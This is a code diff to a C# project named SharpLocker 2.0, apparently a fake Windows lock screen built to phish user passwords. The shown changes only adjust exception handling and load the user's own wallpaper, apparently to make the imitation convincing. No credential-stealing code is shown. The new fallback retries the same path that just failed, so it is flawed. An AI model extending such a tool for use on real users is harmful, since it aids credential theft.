@@ -275,7 +275,7 @@ namespace SharpLocker_2._0
                 Language = new Language(language.Identifier);
                 language.Apply(Language);
             }
-            catch (Exception ex)
+            catch
             {
                 EnglishLanguage l = new EnglishLanguage();
                 Language = new Language(l.Identifier);
@@ -302,7 +302,7 @@ namespace SharpLocker_2._0
 
                 setup.Initialize(Configuration);
             }
-            catch (Exception ex)
+            catch
             {
                 Configuration = new Configuration();
             }
@@ -386,16 +386,27 @@ namespace SharpLocker_2._0
             }
         }
 
-
         // Load the users wallpaper
-        private Bitmap GetBackgroundImage() => new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));
+        private Bitmap GetBackgroundImage()
+        {
+
+            try
+            {
+               return new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));
+            }
+            catch(Exception ex)
+            {
+                if (Configuration.DebugMode) MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));
+            }
+        }
 
         // Set the users wallpaper as the form background
         private void InitializeBackground()
         {
             BackgroundImage = GetBackgroundImage();
         }
+
         // blur the users wallpaper and set it as the form background
         private void BlurBackground()
         {
